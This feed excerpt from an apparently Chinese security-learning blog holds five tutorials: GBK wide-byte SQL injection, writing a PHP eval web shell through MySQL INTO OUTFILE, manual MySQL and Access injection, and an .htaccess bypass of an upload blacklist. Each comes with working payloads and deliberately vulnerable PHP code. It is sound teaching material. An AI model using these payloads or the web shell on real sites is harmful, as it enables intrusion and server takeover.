-  <entry>
-    <title>宽字节注入</title>
-    <link href="http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
-    <published>2020-01-14T02:59:18.000Z</published>
-    <updated>2020-01-14T03:02:54.036Z</updated>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;    &amp;lt;?php  
-    header(&amp;quot;Content-Type: text/html; charset=utf-8&amp;quot;);  
-    $conn = mysql_connect(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;root&amp;#39;);  
-    mysql_select_db(&amp;quot;test&amp;quot;, $conn);  
-    mysql_query(&amp;quot;SET NAMES GBK&amp;quot;, $conn);    //不安全的编码方式  
-
-    $id = addslashes($_GET[&amp;#39;id&amp;#39;]);          //不安全的转义函数  
-    $sql = &amp;quot;select * from test where id=&amp;#39;$id&amp;#39;&amp;quot;;  
-    $query = mysql_query($sql, $conn);  
-    if($query == True)  
-    {  
-        $result = mysql_fetch_array($query);  
-        $user = $result[&amp;quot;user&amp;quot;];  
-        $email = $result[&amp;quot;email&amp;quot;];  
-
-        print_r(&amp;#39;用户名： &amp;#39; . $user . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
-        print_r(&amp;#39;邮  箱： &amp;#39; . $email . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
-        $sql = mb_convert_encoding($sql, &amp;quot;UTF-8&amp;quot;, &amp;quot;GBK&amp;quot;);  
-        print_r(&amp;#39;&amp;lt;br /&amp;gt;SQL语句：&amp;#39; . $sql);  
-
-    }  
-
-    mysql_close($conn);  
-    ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/bl96sy1jzbfxy8njiiy9nsyr/image_1bfrcfjceb4615p1adt1p7fbei9.png&quot; alt=&quot;image_1bfrcfjceb4615p1adt1p7fbei9.png-30.7kB&quot;&gt;&lt;/p&gt;
-&lt;p&gt;单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\（%5c）吃掉。这是因为%df和\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/nt3dex9hvanmum0crsbvg6p9/image_1bfrcg7q7iue2qh5t9otrmsm.png&quot; alt=&quot;image_1bfrcg7q7iue2qh5t9otrmsm.png-29.4kB&quot;&gt;&lt;/p&gt;
-&lt;p&gt;漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：&lt;br&gt;set character_set_connection = gbk,&lt;br&gt;set character_set_results=gbk,&lt;br&gt;set character_set_client=gbk&lt;br&gt;而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。&lt;/p&gt;
-&lt;p&gt; 漏洞的防范方法有以下几种：&lt;br&gt;1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。&lt;br&gt;2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。&lt;br&gt;3） 使用pdo方式预编译处理数据库查询。&lt;/p&gt;
-
-    
-    </summary>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Mysql导出一句话</title>
-    <link href="http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
-    <id>http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/</id>
-    <published>2020-01-14T02:44:59.000Z</published>
-    <updated>2020-01-14T02:49:19.231Z</updated>
-    
-    <summary type="html">
-    
-      &lt;p&gt;执行语句如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;php+HTML&quot;&gt;create table yjh(cmd varchar(50));
-insert into yjh(cmd) values(&amp;#39;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&amp;#39;);
-select cmd from yjh into outfile &amp;#39;D:/www/example/cmd.php&amp;#39;;
-drop table yjh;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：&lt;br&gt;● null，表示不允许导入/导出，默认状态为null；&lt;br&gt;● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；&lt;br&gt;● 没有具体的值，表示不对mysql的导入/导出做出限制。&lt;/p&gt;
-&lt;p&gt;启用secure-file-priv的方法：&lt;br&gt;● Windows下，修改my.cnf 在[mysqld]内加入secure_file_priv =&lt;br&gt;● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =&lt;/p&gt;
-
-    
-    </summary>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MySQL注入</title>
-    <link href="http://yoursite.com/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/</id>
-    <published>2020-01-13T09:31:17.000Z</published>
-    <updated>2020-01-13T10:33:43.357Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;MySQL的一些特性&quot;&gt;&lt;a href=&quot;#MySQL的一些特性&quot; class=&quot;headerlink&quot; title=&quot;MySQL的一些特性&quot;&gt;&lt;/a&gt;MySQL的一些特性&lt;/h3&gt;&lt;p&gt;MySQL的注入比Access好玩得多，这是基于MySQL的特性而定的。看一下MySQL的一些特性：&lt;br&gt;●MySQL通常搭配PHP使用，所以PHP的网站一般都是使用MySQL数据库；&lt;br&gt;●MySQL的数据库文件通常存储在数据库安装路径下，后缀格式是myi，myd，frm；&lt;br&gt;●MySQL有管理员用户名和密码，超级用户是root；&lt;br&gt;●MySQL 5.0以上版本有information_schema数据库，存储着所有数据库下的表名和列名信息。&lt;br&gt;MySQL可以使用和Access一样的猜解方法，但我们通常不会这样做，因为MySQL可以暴力破解数据库的很多信息。&lt;/p&gt;
-&lt;h3 id=&quot;判断注入点&quot;&gt;&lt;a href=&quot;#判断注入点&quot; class=&quot;headerlink&quot; title=&quot;判断注入点&quot;&gt;&lt;/a&gt;判断注入点&lt;/h3&gt;&lt;p&gt;判断注入点需要具体情况具体分析，这里不做介绍。在这里使用我自己写的一个页面来演示。注入点是：&lt;a href=&quot;http://localhost/test/injection.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://localhost/test/injection.php?id=1&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/490m31t8kx00cccg0v4eqr74/1.png&quot; alt=&quot;1.png-17kB&quot;&gt; &lt;/p&gt;
-&lt;h3 id=&quot;判断当前数据表列数&quot;&gt;&lt;a href=&quot;#判断当前数据表列数&quot; class=&quot;headerlink&quot; title=&quot;判断当前数据表列数&quot;&gt;&lt;/a&gt;判断当前数据表列数&lt;/h3&gt;&lt;p&gt;使用order by语句来判断当前数据表的列数，语句如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;order by N&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;N是1，2，3…N，直到页面返回出错，那前面一个数字就是当前数据表的列数。&lt;br&gt;判断当前数据表的列数：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/gteaqk3s6zfq4hkvlh9bkefa/2.png&quot; alt=&quot;2.png-41.6kB&quot;&gt;&lt;br&gt;当前数据表的列数是7。&lt;br&gt;我们也可以使用union语句来判断当前数据表的列数，语句如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;and 1=2 union select 1,2,3…&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;一直增加数字，返回的页面都是出错的，直到返回的页面看到一些数字为止：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/9y80j21sfuvdg4u7jf496eoh/3.png&quot; alt=&quot;3.png-17.1kB&quot;&gt;&lt;br&gt;我们可以看到2，5，6这三个奇怪的数字，这三个数字接下来很有用处。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Access注入</title>
-    <link href="http://yoursite.com/2020/01/13/Access%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2020/01/13/Access%E6%B3%A8%E5%85%A5/</id>
-    <published>2020-01-13T08:58:44.000Z</published>
-    <updated>2020-01-13T09:26:53.757Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;Access的一些特性&quot;&gt;&lt;a href=&quot;#Access的一些特性&quot; class=&quot;headerlink&quot; title=&quot;Access的一些特性&quot;&gt;&lt;/a&gt;Access的一些特性&lt;/h3&gt;&lt;p&gt;Access的一些特性如下：&lt;br&gt;●Aceess通常搭配ASP网站；&lt;br&gt;●Access的数据库文件存放在网站目录下（通常是database或者db目录），后缀格式通常是mdb（也可能是asp或者asa）。我们可以想办法下载数据库文件。&lt;br&gt;●Access数据库没有用户名和密码，也没有数据库名。&lt;/p&gt;
-&lt;h3 id=&quot;Access手工注入&quot;&gt;&lt;a href=&quot;#Access手工注入&quot; class=&quot;headerlink&quot; title=&quot;Access手工注入&quot;&gt;&lt;/a&gt;Access手工注入&lt;/h3&gt;&lt;p&gt;Access注入的步骤通常如下：&lt;br&gt;（1）.判断注入点&lt;br&gt;（2）.猜解表名&lt;br&gt;（3）.猜解列名&lt;br&gt;（4）.猜解内容&lt;/p&gt;
-&lt;h4 id=&quot;判断注入点&quot;&gt;&lt;a href=&quot;#判断注入点&quot; class=&quot;headerlink&quot; title=&quot;判断注入点&quot;&gt;&lt;/a&gt;判断注入点&lt;/h4&gt;&lt;p&gt;判断注入点有很多种方法，要根据具体情况使用，所以这里也不详细解释。&lt;/p&gt;
-&lt;h4 id=&quot;猜解表名&quot;&gt;&lt;a href=&quot;#猜解表名&quot; class=&quot;headerlink&quot; title=&quot;猜解表名&quot;&gt;&lt;/a&gt;猜解表名&lt;/h4&gt;&lt;p&gt;Access的表名和列名都只能靠猜。表名的猜解使用exists函数，猜解语句如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;and exists(select * from 表名)&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;如果返回正常，说明数据库中有这个表。&lt;br&gt;猜解是否有user表：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/vanlgelocnslo0ks81eiccog/1.png&quot; alt=&quot;1.png-34.6kB&quot;&gt;&lt;br&gt;显示出错，说明没有user表。&lt;br&gt;猜解是否有admin表：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/lrve5pbr4w72pwac8njkahkp/2.png&quot; alt=&quot;2.png-291.2kB&quot;&gt;&lt;br&gt;很明显，有admin这个表。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>.htaccess绕过黑名单上传</title>
-    <link href="http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/"/>
-    <id>http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/</id>
-    <published>2020-01-11T10:35:58.000Z</published>
-    <updated>2020-01-14T02:57:12.594Z</updated>
-    
-    <summary type="html">
-    
-      &lt;p&gt;.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。&lt;sup&gt;[1]&lt;/sup&gt;&lt;br&gt;在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。&lt;br&gt;测试上传功能的代码如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;meta http-equiv=&amp;quot;content-type&amp;quot; content=&amp;quot;text/html;charset=utf-8&amp;quot;&amp;gt;
-&amp;lt;form action=&amp;quot;&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
-&amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot;&amp;gt;
-&amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;upload&amp;quot;&amp;gt;
-&amp;lt;/form&amp;gt;
-&amp;lt;?php 
-$black_list = array(&amp;#39;html&amp;#39;, &amp;#39;htm&amp;#39;, &amp;#39;php&amp;#39;, &amp;#39;php2&amp;#39;, &amp;#39;php3&amp;#39;, &amp;#39;php4&amp;#39;, &amp;#39;php5&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;txt&amp;#39;);
-if(isset($_FILES[&amp;#39;file&amp;#39;]))
-{
-    $file_name = $_FILES[&amp;#39;file&amp;#39;][&amp;#39;name&amp;#39;];
-    $file_path = &amp;#39;images/&amp;#39; . $file_name;
-    $file_ext = substr($file_name, strrpos($file_name, &amp;#39;.&amp;#39;)+1);
-    $file_tmp = $_FILES[&amp;#39;file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
-    foreach($black_list as $key=&amp;gt;$value)
-    {
-        if($value == strtolower($file_ext))
-        {
-            echo &amp;quot;不允许上传的文件类型！&amp;quot;;
-            exit(0);
-        }
-    }
-
-    if(!move_uploaded_file($file_tmp, $file_path))
-    {
-        echo &amp;quot;文件上传失败！&amp;quot;;
-    }
-    else
-    {
-        echo &amp;quot;文件上传成功，文件路径为&amp;quot; . $file_path;
-    }
-}
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;新建.htaccess文件内容如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;FilesMatch &amp;quot;lala&amp;quot;&amp;gt;
-SetHandler application/x-httpd-php
-&amp;lt;/FilesMatch&amp;gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png&quot; alt=&quot;1.png-24.9kB&quot;&gt;&lt;br&gt;接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png&quot; alt=&quot;2.png-25.2kB&quot;&gt;&lt;br&gt;两个文件都能上传成功，使用菜刀连接lala文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png&quot; alt=&quot;3.png-75.3kB&quot;&gt;&lt;br&gt;所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。&lt;/p&gt;
-&lt;p&gt;参考：&lt;br&gt;[1]百度百科：&lt;a href=&quot;https://baike.baidu.com/item/htaccess/1645473&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://baike.baidu.com/item/htaccess/1645473&lt;/a&gt;&lt;/p&gt;
-
-    
-    </summary>
-    
-    
-      <category term="文件上传" scheme="http://yoursite.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-    
-      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
   </entry>
   
